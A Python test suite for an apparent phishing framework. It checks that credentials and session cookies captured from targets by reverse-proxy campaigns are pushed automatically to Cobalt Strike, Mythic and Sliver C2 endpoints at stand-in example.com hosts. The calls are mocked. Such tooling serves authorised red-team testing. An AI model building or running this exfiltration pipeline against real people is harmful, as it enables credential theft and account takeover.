"""Tests for the C2 connectors package and dispatch hooks."""

import json
import os
import secrets
import time
from unittest.mock import MagicMock, patch

import pytest

os.environ['DATABASE_URL'] = 'sqlite:///:memory:'

from dropoutjeep import app
from dropoutjeep_lib import db
from dropoutjeep_lib.models import (
    Campaign, CapturedCredential, CapturedCookie, C2ConnectorConfig, Recipient, User,
)


@pytest.fixture
def client():
    app.config['TESTING'] = True
    app.config['WTF_CSRF_ENABLED'] = False
    with app.app_context():
        db.create_all()
        yield app.test_client()
        db.session.remove()
        db.drop_all()


def _create_user(role: str) -> User:
    u = User(username=f'{role}_{secrets.token_hex(4)}', role=role, is_active=True)
    u.set_password('testpass')
    db.session.add(u)
    db.session.commit()
    return u


def _login(client, user: User):
    resp = client.post('/admin/login', data={'username': user.username, 'password': 'testpass'})
    assert resp.status_code == 302


def _api_auth_headers(user: User):
    from dropoutjeep_lib.models import ApiToken
    import hashlib
    plain = secrets.token_urlsafe(32)
    token = ApiToken(
        name='test-token',
        token_hash=hashlib.sha256(plain.encode()).hexdigest(),
        scopes='["campaigns:read","campaigns:write"]',
        created_by_user_id=user.id,
        is_active=True,
    )
    db.session.add(token)
    db.session.commit()
    return {'Authorization': f'Bearer {plain}'}


# ---------------------------------------------------------------------------
# Model and unit tests
# ---------------------------------------------------------------------------

def test_connector_config_serialization(client):
    with app.app_context():
        conn = C2ConnectorConfig(name='cs-test', type='cobalt_strike', is_active=True)
        conn.set_config({'url': 'https://c2.example.com/push', 'password': 'secret'})
        db.session.add(conn)
        db.session.commit()

        loaded = C2ConnectorConfig.query.get(conn.id)
        assert loaded.name == 'cs-test'
        assert loaded.type == 'cobalt_strike'
        assert loaded.get_config()['url'] == 'https://c2.example.com/push'


def test_push_credential_routes_to_cobalt_strike(client):
    conn = MagicMock()
    conn.type = 'cobalt_strike'
    conn.name = 'cs'
    conn.get_config.return_value = {'url': 'https://cs.example.com/push', 'password': 'pw', 'team_server': 'ts'}

    with patch('dropoutjeep_lib.c2.cobalt_strike.requests.post') as mock_post:
        mock_post.return_value = MagicMock(status_code=200)
        credential = MagicMock(
            campaign_id=1,
            recipient_id=2,
            credential_type='password',
            field_name='pass',
            username='alice',
            get_value=lambda: 'hunter2',
            source_path='/login',
            captured_at=None,
        )
        from dropoutjeep_lib.c2 import push_credential
        push_credential(credential, conn)

        mock_post.assert_called_once()
        args, kwargs = mock_post.call_args
        assert kwargs['json']['type'] == 'credential'
        assert kwargs['json']['team_server'] == 'ts'
        assert kwargs['json']['data']['username'] == 'alice'
        assert kwargs['headers']['Authorization'] == 'Bearer pw'


def test_push_cookie_routes_to_mythic(client):
    conn = MagicMock()
    conn.type = 'mythic'
    conn.name = 'mythic'
    conn.get_config.return_value = {'url': 'https://mythic.example.com/webhook', 'api_token': 'tok', 'callback_uuid': 'uuid'}

    with patch('dropoutjeep_lib.c2.mythic.requests.post') as mock_post:
        mock_post.return_value = MagicMock(status_code=202)
        cookie = MagicMock(
            campaign_id=1,
            recipient_token='abc',
            cookie_name='session',
            cookie_value='secret-cookie',
            cookie_domain='example.com',
            cookie_path='/',
            source='response',
            captured_at=None,
        )
        from dropoutjeep_lib.c2 import push_cookie
        push_cookie(cookie, conn)

        mock_post.assert_called_once()
        args, kwargs = mock_post.call_args
        assert kwargs['json']['type'] == 'cookie'
        assert kwargs['json']['callback_uuid'] == 'uuid'
        assert kwargs['json']['data']['cookie_name'] == 'session'
        assert kwargs['headers']['Authorization'] == 'Bearer tok'


def test_sliver_http_fallback_when_no_grpc_url(client):
    conn = MagicMock()
    conn.type = 'sliver'
    conn.name = 'sliver'
    conn.get_config.return_value = {'url': 'https://sliver.example.com/push', 'password': 'pw'}

    with patch('dropoutjeep_lib.c2.sliver.requests.post') as mock_post:
        mock_post.return_value = MagicMock(status_code=200)
        from dropoutjeep_lib.c2 import push_credential
        push_credential({'campaign_id': 1, 'username': 'bob', 'captured_at': None}, conn)
        mock_post.assert_called_once()


def test_sliver_logs_when_grpc_unavailable(client, monkeypatch, caplog):
    monkeypatch.setattr('dropoutjeep_lib.c2.sliver._GRPC_AVAILABLE', False)
    conn = MagicMock()
    conn.type = 'sliver'
    conn.name = 'sliver'
    conn.get_config.return_value = {'grpc_url': 'grpc://sliver.example.com:31337'}

    with patch('dropoutjeep_lib.c2.sliver.requests.post') as mock_post:
        mock_post.return_value = MagicMock(status_code=200)
        from dropoutjeep_lib.c2 import push_credential
        with caplog.at_level('WARNING'):
            push_credential({'campaign_id': 1, 'captured_at': None}, conn)
        assert 'grpc library is not installed' in caplog.text


# ---------------------------------------------------------------------------
# API CRUD tests
# ---------------------------------------------------------------------------

def test_api_create_connector(client):
    user = _create_user('operator')
    headers = _api_auth_headers(user)
    resp = client.post('/api/c2/connectors/', json={
        'name': 'CS Prod',
        'type': 'cobalt_strike',
        'url': 'https://cs.example.com/push',
        'password': 'secret',
    }, headers=headers)
    assert resp.status_code == 201
    data = resp.get_json()
    assert data['name'] == 'CS Prod'
    assert data['type'] == 'cobalt_strike'
    assert data['config']['url'] == 'https://cs.example.com/push'


def test_api_list_connectors(client):
    user = _create_user('operator')
    headers = _api_auth_headers(user)
    client.post('/api/c2/connectors/', json={'name': 'A', 'type': 'mythic', 'url': 'https://a.com'},
                headers=headers)
    client.post('/api/c2/connectors/', json={'name': 'B', 'type': 'sliver', 'url': 'https://b.com'},
                headers=headers)
    resp = client.get('/api/c2/connectors/', headers=headers)
    assert resp.status_code == 200
    data = resp.get_json()
    assert len(data) == 2
    assert {d['name'] for d in data} == {'A', 'B'}


def test_api_get_update_delete_connector(client):
    user = _create_user('operator')
    headers = _api_auth_headers(user)
    resp = client.post('/api/c2/connectors/', json={
        'name': 'Old',
        'type': 'cobalt_strike',
        'url': 'https://old.com',
    }, headers=headers)
    cid = resp.get_json()['id']

    resp = client.get(f'/api/c2/connectors/{cid}', headers=headers)
    assert resp.status_code == 200
    assert resp.get_json()['name'] == 'Old'

    resp = client.patch(f'/api/c2/connectors/{cid}', json={
        'name': 'New',
        'url': 'https://new.com',
        'is_active': False,
    }, headers=headers)
    assert resp.status_code == 200
    data = resp.get_json()
    assert data['name'] == 'New'
    assert data['config']['url'] == 'https://new.com'
    assert data['is_active'] is False

    resp = client.delete(f'/api/c2/connectors/{cid}', headers=headers)
    assert resp.status_code == 200
    with app.app_context():
        assert C2ConnectorConfig.query.get(cid) is None


# ---------------------------------------------------------------------------
# Admin UI tests
# ---------------------------------------------------------------------------

def test_admin_c2_connector_list_requires_admin(client):
    user = _create_user('viewer')
    _login(client, user)
    resp = client.get('/admin/c2-connectors/')
    assert resp.status_code == 403


def test_admin_c2_connector_crud(client):
    user = _create_user('admin')
    _login(client, user)

    resp = client.post('/admin/c2-connectors/new', data={
        'name': 'Admin CS',
        'type': 'cobalt_strike',
        'url': 'https://admin-cs.example.com/push',
        'password': 'pw',
    })
    assert resp.status_code == 302

    with app.app_context():
        conn = C2ConnectorConfig.query.filter_by(name='Admin CS').first()
        assert conn is not None
        assert conn.type == 'cobalt_strike'

    resp = client.post(f'/admin/c2-connectors/{conn.id}/toggle', data={})
    assert resp.status_code == 302
    with app.app_context():
        assert C2ConnectorConfig.query.get(conn.id).is_active is False

    resp = client.post(f'/admin/c2-connectors/{conn.id}/delete', data={})
    assert resp.status_code == 302
    with app.app_context():
        assert C2ConnectorConfig.query.get(conn.id) is None


# ---------------------------------------------------------------------------
# after_insert dispatch hook tests
# ---------------------------------------------------------------------------

def test_credential_capture_triggers_c2_dispatch(client):
    with app.app_context():
        campaign = Campaign(name='C2 Test', subject='s', body_html='b', landing_html='l',
                            flow_type='reverse_proxy')
        campaign.set_flow_config({'target_url': 'https://target.example.com', 'capture_credentials': True})
        db.session.add(campaign)
        db.session.commit()
        recipient = Recipient(campaign_id=campaign.id, email='victim@example.com')
        db.session.add(recipient)
        conn = C2ConnectorConfig(name='hook-cs', type='cobalt_strike', is_active=True)
        conn.set_config({'url': 'https://cs.example.com/push'})
        db.session.add(conn)
        db.session.commit()

        with patch('dropoutjeep_lib.c2.cobalt_strike.requests.post') as mock_post:
            mock_post.return_value = MagicMock(status_code=200)
            credential = CapturedCredential(
                campaign_id=campaign.id,
                recipient_id=recipient.id,
                credential_type='password',
                field_name='pass',
                username='victim@example.com',
                source_path='/login',
            )
            credential.set_value('hunter2')
            db.session.add(credential)
            db.session.commit()

            # Wait briefly for the background thread to run.
            time.sleep(0.3)
            mock_post.assert_called_once()
            args, kwargs = mock_post.call_args
            assert kwargs['json']['type'] == 'credential'
            assert kwargs['json']['data']['username'] == 'victim@example.com'


def test_cookie_capture_triggers_c2_dispatch(client):
    with app.app_context():
        campaign = Campaign(name='C2 Cookie Test', subject='s', body_html='b', landing_html='l',
                            flow_type='reverse_proxy')
        campaign.set_flow_config({'target_url': 'https://target.example.com', 'capture_cookies': True})
        db.session.add(campaign)
        db.session.commit()
        conn = C2ConnectorConfig(name='hook-mythic', type='mythic', is_active=True)
        conn.set_config({'url': 'https://mythic.example.com/webhook'})
        db.session.add(conn)
        db.session.commit()

        with patch('dropoutjeep_lib.c2.mythic.requests.post') as mock_post:
            mock_post.return_value = MagicMock(status_code=202)
            cookie = CapturedCookie(
                campaign_id=campaign.id,
                recipient_token='abc123',
                cookie_name='session',
                cookie_value='topsecret',
                cookie_domain='target.example.com',
                source='response',
            )
            db.session.add(cookie)
            db.session.commit()

            time.sleep(0.3)
            mock_post.assert_called_once()
            args, kwargs = mock_post.call_args
            assert kwargs['json']['type'] == 'cookie'
            assert kwargs['json']['data']['cookie_name'] == 'session'
